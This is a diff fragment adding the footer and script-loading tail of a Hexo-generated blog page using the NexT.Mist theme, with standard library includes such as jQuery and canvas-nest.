+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shifeng_kaze</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
